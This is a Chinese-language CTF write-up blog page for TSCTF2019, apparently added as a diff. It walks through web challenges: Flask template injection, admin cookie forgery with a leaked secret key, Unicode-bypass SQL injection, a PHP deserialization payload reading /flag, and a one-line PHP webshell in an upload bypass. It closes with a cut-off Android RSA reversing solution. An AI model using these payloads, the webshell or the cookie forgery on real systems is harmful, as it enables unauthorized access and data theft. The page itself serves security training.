@@ -1,0 +1,1319 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="TSCTF2019，比去年进步一丢丢">
+<meta name="keywords" content="Web,Android,Photography">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TSCTF2019 线上">
+<meta property="og:url" content="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/index.html">
+<meta property="og:site_name" content="White2Bai&#39;s Blog">
+<meta property="og:description" content="TSCTF2019，比去年进步一丢丢">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/secret_key.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/adminPage.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/upload.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/rsaEncode.jpg">
+<meta property="og:updated_time" content="2019-05-15T02:02:25.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TSCTF2019 线上">
+<meta name="twitter:description" content="TSCTF2019，比去年进步一丢丢">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/secret_key.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/"/>
+
+
+
+
+
+  <title>TSCTF2019 线上 | White2Bai's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">White2Bai's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">世事秋凉，道阻且长。<br/>愿你我都能去危就安，得偿所望。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/13/ctf-wp/TSCTF2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="White2Bai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="White2Bai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TSCTF2019 线上</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-13T17:00:00+00:00">
+                2019-05-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/05/13/ctf-wp/TSCTF2019/" class="leancloud_visitors" data-flag-title="TSCTF2019 线上">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count">次</span>
+             </span>
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  TSCTF2019，比去年进步一丢丢
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr>
+<h2 id="Easy-Injection"><a href="#Easy-Injection" class="headerlink" title="Easy Injection"></a>Easy Injection</h2><p>题目给了一个url和hint：为什么查询语句大写</p>
+<p>访问url后表单可以输入username和password，输入任意user和pwd，返回:</p>
+<blockquote>
+<p>Hello,’用户名’</p>
+</blockquote>
+<p>当username = admin，任意password时返回</p>
+<blockquote>
+<p>Wrong password.</p>
+</blockquote>
+<p>猜测需要获得pwd或者admin的身份</p>
+<h3 id="python模板注入"><a href="#python模板注入" class="headerlink" title="python模板注入"></a>python模板注入</h3><p>其中username存在<a href="https://uuzdaisuki.com/2018/05/28/SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">模板注入</a>，通过访问config全局变量得到SECRET_KEY的值</p>
+<p><img src="secret_key.png" width="50%" height="50%" align="center/"></p>
+<h3 id="config-SECRET-KEY-cookie"><a href="#config-SECRET-KEY-cookie" class="headerlink" title="config[SECRET_KEY]+cookie"></a>config[SECRET_KEY]+cookie</h3><p>这里涉及到另一个知识点，flask中使用SECRET_KEY加密某些数据得到cookie</p>
+<p>通过任意注册用户得到的cookie解出明文，是输入的username，那么可以加密’admin’得到admin的cookie</p>
+<blockquote>
+<p>eyJ1c2VybmFtZSI6ImFkbWluIn0.XNZT0w.ZZEA-69I9r2ejYxq1DX6O46dzaU</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleSecureCookieSessionInterface</span><span class="params">(SecureCookieSessionInterface)</span>:</span></span><br><span class="line">	<span class="comment"># Override method</span></span><br><span class="line">	<span class="comment"># Take secret_key instead of an instance of a Flask app</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> secret_key:</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">		signer_kwargs = dict(</span><br><span class="line">			key_derivation=self.key_derivation,</span><br><span class="line">			digest_method=self.digest_method</span><br><span class="line">		)</span><br><span class="line">		<span class="keyword">return</span> URLSafeTimedSerializer(secret_key, salt=self.salt,</span><br><span class="line">									  serializer=self.serializer,</span><br><span class="line">									  signer_kwargs=signer_kwargs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFlaskCookie</span><span class="params">(secret_key, cookieValue)</span>:</span></span><br><span class="line">	sscsi = SimpleSecureCookieSessionInterface()</span><br><span class="line">	signingSerializer = sscsi.get_signing_serializer(secret_key)</span><br><span class="line">	<span class="keyword">return</span> signingSerializer.loads(cookieValue)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep in mind that flask uses unicode strings for the</span></span><br><span class="line"><span class="comment"># dictionary keys</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlaskCookie</span><span class="params">(secret_key, cookieDict)</span>:</span></span><br><span class="line">	sscsi = SimpleSecureCookieSessionInterface()</span><br><span class="line">	signingSerializer = sscsi.get_signing_serializer(secret_key)</span><br><span class="line">	<span class="keyword">return</span> signingSerializer.dumps(cookieDict)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdminCookie</span><span class="params">()</span>:</span></span><br><span class="line">	sk = <span class="string">'veRy_coMpliCatEd_seCreT_keY'</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#=======-----get cookie when username's value is &#123;&#123;1&#125;&#125;</span></span><br><span class="line">	userCookie = <span class="string">'eyJ1c2VybmFtZSI6Int7MX19In0.XNZPBg.1bVKD2WoDWIUD_KTMUYeTLwXRUQ'</span></span><br><span class="line">	<span class="keyword">print</span> decodeFlaskCookie(sk,userCookie)<span class="comment">#&#123;u'username': u'&#123;&#123;1&#125;&#125;'&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#=======-----get admin's cookie when username's value is admin</span></span><br><span class="line">	adminCookie = &#123;<span class="string">u'username'</span>: <span class="string">u'admin'</span>&#125;</span><br><span class="line">	<span class="keyword">print</span> encodeFlaskCookie(sk, adminCookie)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> adminCookie</span><br></pre></td></tr></table></figure>
+<p>获得admin身份成功登陆后得到下一步提示</p>
+<p><img src="adminPage.png" width="50%" height="50%" align="center/"></p>
+<p>继续利用cookie访问该url，?id=1时返回</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your input : 1<span class="tag">&lt;/<span class="name">br</span>&gt;</span>Your database query statement : SELECT * FROM USER WHERE ID = 1;<span class="tag">&lt;/<span class="name">br</span>&gt;</span>Query result :  TESTUSER1</span><br></pre></td></tr></table></figure>
+<p>可以看出id存在sql注入，经过测试，waf会检测空格、union、select、flag关键字</p>
+<p>空格使用+进行替换</p>
+<h3 id="unicode-大小写-绕过"><a href="#unicode-大小写-绕过" class="headerlink" title="unicode 大小写 绕过"></a>unicode 大小写 绕过</h3><p>根据hint，后台会把输入数据使用upper()转换成大写，然后进行查询</p>
+<p>可以用unicode 大小写绕过</p>
+<p>参考：<a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/" target="_blank" rel="noopener">https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/</a> 的”nodechr”这题</p>
+<blockquote>
+<p>K —- k<br>ß(223) —- SS<br>ı(305) —- I<br>ſ(383) —- S<br>ﬀ(64256) —- FF<br>ﬁ(64257) —- FI<br>ﬂ(64258) —- FL<br>ﬃ(64259) —- FFI<br>ﬄ(64260) —- FFL<br>ﬅ(64261) —- ST<br>ﬆ(64262) —- ST</p>
+</blockquote>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>接下来正常sql注入得到flag</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1+unıon+ſelect+1,(ſelect+group_concat(ﬂag)+from+ﬂag+limit+1),3+#</span><br><span class="line">Your input : -1 unıon ſelect 1,(ſelect group_concat(ﬂag) from ﬂag limit 1),3 &lt;/br&gt;Your database query statement : <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">WHERE</span> ID = <span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> GROUP_CONCAT(FLAG) <span class="keyword">FROM</span> FLAG <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="number">3</span> ;&lt;/br&gt;Query result : TSCTF&#123;Upp3rCa5e_Is_S0_cooL&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Object"><a href="#Object" class="headerlink" title="Object?"></a>Object?</h2><p>题目给出game.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ini_set("display_errors", "On");  </span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogLog</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $log_ = <span class="string">'/tmp/web_log'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data=null)</span> </span>&#123;</span><br><span class="line">    $temp = <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($temp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// No, you can't control an object anymore!</span></span><br><span class="line">    $format = <span class="string">'/O:\d:/'</span>;</span><br><span class="line">    $flag = <span class="keyword">true</span>;</span><br><span class="line">    $flag = $flag &amp;&amp; substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span>;</span><br><span class="line">    $flag = $flag &amp;&amp; (!preg_match($format, $data));</span><br><span class="line">    <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getLog</span><span class="params">($filename=null)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;log_ != <span class="keyword">null</span>)</span><br><span class="line">      $filename = <span class="keyword">$this</span>-&gt;log_;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="keyword">$this</span>-&gt;content, $k[<span class="string">'name'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;getLog();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))&#123;</span><br><span class="line">  $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">  <span class="keyword">new</span> BlogLog($data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>通过getLog()访问$log_ 并输出</p>
+<h3 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h3><p>使用unserialize()，__destruct()，存在反序列化漏洞</p>
+<p>但是在init()中进行输入过滤<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">substr</span><span class="params">(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>)</span></span> !== <span class="string">'O:'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">'/O:\d:/'</span>, <span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure></p>
+<p>第一个通过序列化数组绕过</p>
+<p>第二个通过php反序列化的bug绕过，在对象长度前添加一个+号，即o:14-&gt;o:+14</p>
+<blockquote>
+<p>参考：<a href="http://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">http://www.phpbug.cn/archives/32.html</a></p>
+</blockquote>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//+:%2B</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogLog</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $log_ = <span class="string">'/flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$myblog = <span class="keyword">new</span> BlogLog();</span><br><span class="line">$myarray = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'test'</span>,$myblog);</span><br><span class="line">$myarray = serialize($myarray);</span><br><span class="line"><span class="keyword">echo</span> $myarray.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($myarray).<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>a:2:{s:4:”name”;s:4:”test”;i:0;O:7:”BlogLog”:1:{s:4:”log_”;s:5:”/flag”;}}</p>
+</blockquote>
+<p>把o:7-&gt;o:+7，然后编码[urlencode(‘+’)-&gt;%2B]</p>
+<blockquote>
+<p>a%3A2%3A%7Bs%3A4%3A”name”%3Bs%3A4%3A”test”%3Bi%3A0%3BO%3A%2B7%3A”BlogLog”%3A1%3A%7Bs%3A4%3A”log_”%3Bs%3A5%3A”%2Fflag”%3B%7D%7D</p>
+</blockquote>
+<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p>访问</p>
+<blockquote>
+<p><a href="http://10.112.100.47:8233/game.php?data=a%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bi%3A0%3BO%3A%2B7%3A%22BlogLog%22%3A1%3A%7Bs%3A4%3A%22log_%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D" target="_blank" rel="noopener">http://10.112.100.47:8233/game.php?data=a%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bi%3A0%3BO%3A%2B7%3A%22BlogLog%22%3A1%3A%7Bs%3A4%3A%22log_%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</a></p>
+</blockquote>
+<p>得到flag</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>序列化的结果需要url编码</p>
+<p>保存flag的文件需要爆破，常见:/flag、/flag.txt、/flag.php等</p>
+<h2 id="JustUpload"><a href="#JustUpload" class="headerlink" title="JustUpload"></a>JustUpload</h2><p>题目需要上传文件，经过测试，只能上传图片类型文件（白名单），对文件名后缀采用黑名单限制，对上传的文件内容和长度进行限制（len&lt;=15）</p>
+<h3 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h3><p>php-&gt;php4</p>
+<h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>在Content-Type、文件头进行判断</p>
+<blockquote>
+<p>Content-Type：image/jpeg</p>
+</blockquote>
+<p>上传图片头标识位：</p>
+<blockquote>
+<p>jpg —&gt; FFD8FF<br>png —&gt; 89504E47 0D0A1A0A</p>
+</blockquote>
+<h3 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h3><p>上传的文件内容中不允许出现php关键字，使用php短标签绕过，同时许多关键字可以被特殊字符替代</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php?&gt; ---&gt; &lt;?...;</span><br><span class="line"></span><br><span class="line">echo ---&gt; =</span><br><span class="line"></span><br><span class="line">shell_exec() ---&gt; ``（反引号）</span><br><span class="line"></span><br><span class="line">变量 ---&gt; $_</span><br><span class="line"></span><br><span class="line">支持正则：/bin/cat ---&gt; /???/??? 或者 /???/??t</span><br></pre></td></tr></table></figure>
+<p>本来使用最短一句话就行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>=`$_GET[<span class="number">1</span>]`;</span></span><br></pre></td></tr></table></figure>
+<p>但是内容长度&lt;=15，由于图片头已经占了3位，php标签占6位，剩下写入命令的长度只剩6位，所以不能上传一句话</p>
+<p>可以尝试通过反引号直接命令执行</p>
+<p>payload：<br><img src="upload.jpg" width="50%" height="50%" align="center/"></p>
+<p>上传成功后返回文件路径，访问后得到flag</p>
+<h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>得到flag的命令使用的是</p>
+<blockquote>
+<p>ls /</p>
+</blockquote>
+<p>能不能猜到真的是靠命……</p>
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><hr>
+<h2 id="APK-Open-Sesame"><a href="#APK-Open-Sesame" class="headerlink" title="[APK]Open Sesame!"></a>[APK]Open Sesame!</h2><p>反编译apk，分析java层代码，对输入的key进行check，找到libnative-check.so</p>
+<h3 id="jnihelloword"><a href="#jnihelloword" class="headerlink" title="jnihelloword"></a>jnihelloword</h3><p>使用rsaEncode()对key进行加密，与encrypt字符串进行比较。猜测encrypt是加密后的字符串，key是原始字符串</p>
+<h3 id="rsaEncode"><a href="#rsaEncode" class="headerlink" title="rsaEncode"></a>rsaEncode</h3><p>核心部分见图<br><img src="rsaEncode.jpg" align="center/"></p>
+<p>对输入的key的每个字符做rsa加密，每次循环e次</p>
+<p>题目中给出了e、n，解密需要得到d，由于加密时间复杂度低同时明文长度短，可以直接猜解flag</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>在解密之前需要得到encrypt字符串内容，需要动态调试</p>
+<p>且需要绕过反调试</p>
+<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">encrypt=[<span class="string">'0x212695'</span>, <span class="string">'0x190464'</span>, <span class="string">'0x4dd7c7'</span>, <span class="string">'0x212695'</span>, <span class="string">'0x46c66c'</span>, <span class="string">'0x4fcde7'</span>, <span class="string">'0x254cff'</span>, <span class="string">'0x243d43'</span>, <span class="string">'0x22dbb9'</span>, <span class="string">'0x3f9d3f'</span>, <span class="string">'0x5168f7'</span>, <span class="string">'0x15f7b1'</span>, <span class="string">'0x401ea6'</span>, <span class="string">'0x05cfdc'</span>, <span class="string">'0x4c3596'</span>, <span class="string">'0x15f7b1'</span>, <span class="string">'0x401ea6'</span>, <span class="string">'0x2ba2c6'</span>, <span class="string">'0x243d43'</span>, <span class="string">'0x22dbb9'</span>, <span class="string">'0x46d1e0'</span>, <span class="string">'0x377dad'</span>, <span class="string">'0x1d2b29'</span>, <span class="string">'0x626d61'</span>, <span class="string">'0x261306'</span>, <span class="string">'0x5168f7'</span>, <span class="string">'0x261306'</span>, <span class="string">'0x1d2b29'</span>, <span class="string">'0x152bef'</span>, <span class="string">'0x46d1e0'</span>, <span class="string">'0x1d2b29'</span>, <span class="string">'0x1be9f4'</span>, <span class="string">'0x5c8e3e'</span>, <span class="string">'0x05cfdc'</span>, <span class="string">'0x5168f7'</span>, <span class="string">'0x1d2b29'</span>, <span class="string">'0x3f9d3f'</span>, <span class="string">'0x2ba2c6'</span>,<span class="string">'0x1749d9'</span>,<span class="string">'0x041ea6'</span>,<span class="string">'0x1d2b29'</span>,<span class="string">'0x537a14'</span>,<span class="string">'0x5c8e3e'</span>,<span class="string">'0x152bef'</span>,<span class="string">'0x270148'</span>,<span class="string">'0x10f74f'</span>,<span 